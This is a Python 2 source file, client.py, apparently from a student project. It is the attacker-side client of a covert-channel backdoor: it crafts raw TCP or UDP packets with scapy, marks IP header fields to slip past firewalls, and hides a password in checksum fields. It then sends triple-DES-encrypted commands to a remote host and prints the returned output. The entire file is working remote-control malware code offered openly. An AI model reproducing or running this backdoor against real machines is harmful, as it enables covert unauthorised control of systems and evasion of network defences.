#	client.py
#
#	Design and Program: Vishav Singh
#                     Manuel Gonzales
#
#	functions:
#
#		def pass_encode(plaintext, key)
#		def sniffer(src, key)
#		def read_packets(packet_received, key)
#		def send_password(source_ip, destination_ip, destination_port, encodedpassword)
#		def send_command(source_ip, destination_ip, destination_port, key)
#		def split_every(n, s)
#		def main()
#
#	Backdoor script that would be able to stablish a "connection with an attacker" using 
#	covert channels and an encrypted connection. The transfer is made on card level on both
#	ends in order to avoid firewalls and such applications.
#

import threading
import optparse
import string
from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP
from pyDes import *


#Constants
CONST_ENCODE_MOD = 126
CONST_MAXIMUM_PORT = 65535
CONST_TTL_VALUE = 65
CONST_CHECKSUM_VALUE = 0x0001
CONST_TOS_VALUE = 0x01


#Globals
stop_running = False
connected = False
tcp = False	#used to know if TCP or UDP has been selected


#function to decode the password (need caesar because the password comes split into packets)
#plaintext - text to encode
#key - key to shift
def pass_encode(plaintext, key):
    cipher = ''
    for each in plaintext:
        c = (ord(each) + key) % CONST_ENCODE_MOD
        if c < 32:
            c += 31
        cipher += chr(c)

    return cipher


#function to get the packets from the network and assign it for parsing.
#src - source port to sniff from
#key - DES key to decrypt payload
def sniffer(src, key):
    global tcp
    global stop_running
    global connected
    while stop_running is False:
        if tcp:
            pkt = sniff(filter="tcp and ip[1] == 1 and ip[8] == 65 and ip[11] = 1 and dst port " + str(src), count=1, store=1)
        else:
            pkt = sniff(filter="udp and ip[1] == 1 and ip[8] == 65 and ip[11] = 1 and dst port " + str(src), count=1, store=1)

        thread_parse = threading.Thread(target=read_packets, args=(pkt[0], key))
        thread_parse.start()


#function to parse the packets received (decrypt them and print them accordingly)
#packet_received - packet sniffed
#key - DES key to decrypt payload
def read_packets(packet_received, key):

    global tcp
    global connected
    global stop_running

    try:
        if tcp:
            message_to_decode = str(packet_received[TCP].payload)
        else:
            message_to_decode = str(packet_received[UDP].payload)

        message_plain = triple_des(key).decrypt(message_to_decode, padmode=2)
       
        if message_plain == "continue":
            connected = True
            print "Connection Established..."
            return

        if message_plain == "exit":
            print "Closing Connection...."
            stop_running = True
            time.sleep(1)
            print "Connection Closed."
            os.kill(os.getpid(), 9) 
            return

        sys.stdout.write(message_plain)

    except:
        return 
    return

#function to parse the packets received (decrypt them and print them accordingly)
#source_ip - ip address from source
#destination_ip - destination ip address
#destination_port - port to send it to
#encodedpassword - password to authenticate - encoded
def send_password(source_ip, destination_ip, destination_port, encodedpassword):

    global tcp
    try:

        if tcp:
            tcp_packet = IP()/TCP()

            tcp_packet[IP].chksum = CONST_CHECKSUM_VALUE
            tcp_packet[IP].ttl = CONST_TTL_VALUE
            tcp_packet[IP].tos = CONST_TOS_VALUE
            tcp_packet[IP].version = 4L
            tcp_packet[IP].frag = 0L
            tcp_packet[IP].src = source_ip
            tcp_packet[IP].dst = destination_ip
            tcp_packet[IP].proto = 0x06

            # Crafting TCP header
            tcp_packet[TCP].seq = random.randint(pow(2, 20), pow(2, 32) - 1)
            tcp_packet[TCP].sport = random.randint(0, CONST_MAXIMUM_PORT)
            tcp_packet[TCP].dport = destination_port
            tcp_packet[TCP].flags = 0x08

            # Encoding the Password in the Checksum field
            for (i, j) in zip(encodedpassword[0::2], encodedpassword[1::2]):
                tcp_packet[TCP].payload = random.choice(string.letters)
                tcp_packet[TCP].seq += 1
                value = int(((i + j).encode("hex")), 16)
                tcp_packet[TCP].chksum = value

                send(tcp_packet, verbose=0)
                time.sleep(0.5)

        else:

            udp_packet = IP() / UDP()

            udp_packet[IP].chksum = CONST_CHECKSUM_VALUE
            udp_packet[IP].ttl = CONST_TTL_VALUE
            udp_packet[IP].tos = CONST_TOS_VALUE
            udp_packet[IP].version = 4L
            udp_packet[IP].frag = 0L
            udp_packet[IP].src = source_ip
            udp_packet[IP].dst = destination_ip
            udp_packet[IP].proto = 0x11

            # Crafting TCP header
            udp_packet[UDP].sport = random.randint(0, CONST_MAXIMUM_PORT)
            udp_packet[UDP].dport = destination_port

            # Encoding the Password in the Checksum field
            for (i, j) in zip(encodedpassword[0::2], encodedpassword[1::2]):
                udp_packet[UDP].payload = random.choice(string.letters)
                value = int(((i + j).encode("hex")), 16)
                udp_packet[UDP].chksum = value

                send(udp_packet, verbose=0)
                time.sleep(0.5)

        print "Password successfully sent"

    except IndexError as E:
        return E
    return
	
	
#function to split a large string into a set of substrings in an array
#n - size of each substring
#s - string value
def split_every(n, s):
     return [ s[i:i+n] for i in range(0, len(s), n) ]

	 
#This method will take user input and send it to the Destination specifed
#source_ip - ip address from source
#destination_ip - destination ip address
#destination_port - port to send it to
#key - DES key to encrypt payload
def send_command(source_ip, destination_ip, destination_port, key):

    global stop_running
    global connected
    time.sleep(5)
    while stop_running is False:

        command = raw_input("\nPlease enter a command> ")

        if connected is False:
            print("Not Connected, restart application")
            stop_running = True
            time.sleep(1)
            os.kill(os.getpid(), 9)
            continue
	

        encoded_command = triple_des(key).encrypt(command, padmode=2)
	command_map= split_every(1024,encoded_command)
	for s in command_map:
	    try:

		if tcp:

		    tcp_packet = IP() / TCP()
		    # Crafting IP Header
		    tcp_packet[IP].chksum = CONST_CHECKSUM_VALUE
		    tcp_packet[IP].ttl = CONST_TTL_VALUE
		    tcp_packet[IP].tos = CONST_TOS_VALUE
		    tcp_packet[IP].version = 4L
		    tcp_packet[IP].frag = 0L
		    tcp_packet[IP].src = source_ip
		    tcp_packet[IP].dst = destination_ip
		    tcp_packet[IP].proto = 0x06
		    # Crafting TCP header
		    tcp_packet[TCP].seq = random.randint(pow(2, 20), pow(2, 32) - 1)
		    tcp_packet[TCP].sport = random.randint(0, 65535)
		    tcp_packet[TCP].dport = destination_port
		    tcp_packet[TCP].flags = 0x08
		    # Encoding the Password in the Checksum field

		    tcp_packet[TCP].chksum = 0x0001
		    tcp_packet[TCP].payload = encoded_command

		    send(tcp_packet,verbose=0)
		    time.sleep(0.1)

	        else:

		    udp_packet = IP() / UDP()

		    udp_packet[IP].chksum = CONST_CHECKSUM_VALUE
		    udp_packet[IP].ttl = CONST_TTL_VALUE
		    udp_packet[IP].tos = CONST_TOS_VALUE
		    udp_packet[IP].version = 4L
		    udp_packet[IP].frag = 0L
		    udp_packet[IP].src = source_ip
		    udp_packet[IP].dst = destination_ip
		    udp_packet[IP].proto = 0x11

		    # Crafting TCP header
		    udp_packet[UDP].sport = random.randint(0, CONST_MAXIMUM_PORT)
		    udp_packet[UDP].dport = destination_port

		    udp_packet[UDP].payload = encoded_command

		    send(udp_packet, verbose=0)
		    time.sleep(0.1)

	    except IndexError as E:
		return E

	time.sleep(2)

	if command == "exit":
	    print("Connection to " + str(source_ip) + " closed.")
	    stop_running = True
	    time.sleep(1)
	    os.kill(os.getpid(), 9)

    return
	
	
#main function to parse arguments and start script
def main():
    parser = optparse.OptionParser()
    
    parser.add_option("-s", "--source", type="string", dest="source_ip",
                      help="[REQUIRED] Source Address for the packets")
    parser.add_option("-g", "--source_port", type="int", dest="source_port",
                      help="[REQUIRED] Source Address for the packets")
    parser.add_option("-i", "--destination", type="string", dest="destination_ip",
                      help="[REQUIRED] Destination Address for the packets")
    parser.add_option("-d", "--destination_port", type="int", dest="destination_port",
                      help="[REQUIRED] Port to Listen for packets")
    parser.add_option("-t", "--tcp", action="store_true", dest="tcp_flag", default=False,
                      help="Use TCP packet to send the data")
    parser.add_option("-u", "--udp", action="store_true", dest="udp_flag", default=False,
                      help="Use UDP datagram to send the data")
    parser.add_option("-p", "--password", type="string", dest="password",
                      help="[REQUIRED] Password to Establish Connection (10 bytes)")
    parser.add_option("-n", "--number", type="int", dest="passnumber",
                      help="[REQUIRED] Number used to Encode Password")
    parser.add_option("-k", "--key", type="string", dest="key",
                      help="[REQUIRED] Key to Encrypt Connection (16 bytes)")
    parser.add_option("-e", "--established", action="store_true", dest="established", default=False,
                      help="Use it if connection has already been established and trying to reconnect")

    (options, args) = parser.parse_args()

    print "\nPress 'exit' at any time to end the connection\n"

    if len(sys.argv) < 2:
        parser.error("Use -h or --help for instructions")

    if not options.source_port or not options.destination_port or not options.source_ip or not options.password or not options.destination_ip or not options.passnumber or not options.key:
        parser.error("Please fill in all the required parameters")

    if len(options.password) != 10:
        parser.error("Please use a 10 bytes password")

    if len(options.key) != 16:
        parser.error("Please use a 16 bytes Key")

    try:
        pass_number = int(options.passnumber)
    except ValueError:
        parser.error("Please enter a valid number")

    if options.source_port < 0 or options.source_port > CONST_MAXIMUM_PORT:
        parser.error("Please enter a valid source port number")


    if options.destination_port < 0 or options.destination_port > CONST_MAXIMUM_PORT:
        parser.error("Please enter a valid destination port number")

    if options.tcp_flag is False and options.udp_flag is False:
        parser.error("Please select the protocol to use --tcp or --udp")

    if options.tcp_flag is True and options.udp_flag is True:
        parser.error("Please select only one of the protocols --tcp or --udp")
		
    global connected
    if options.established is True:
	connected = True		

    global tcp
    tcp = options.tcp_flag

    thread_send_password = threading.Thread(target=send_password, args=(options.source_ip, options.destination_ip, options.destination_port,
                                                                        pass_encode(options.password, pass_number)))
    thread_send_password.start()

    thread_send_command = threading.Thread(target=send_command, args=(options.source_ip, options.destination_ip, options.destination_port,
                                                                      options.key))
    thread_send_command.start()

    sniffer(options.source_port, options.key)

#run
main()
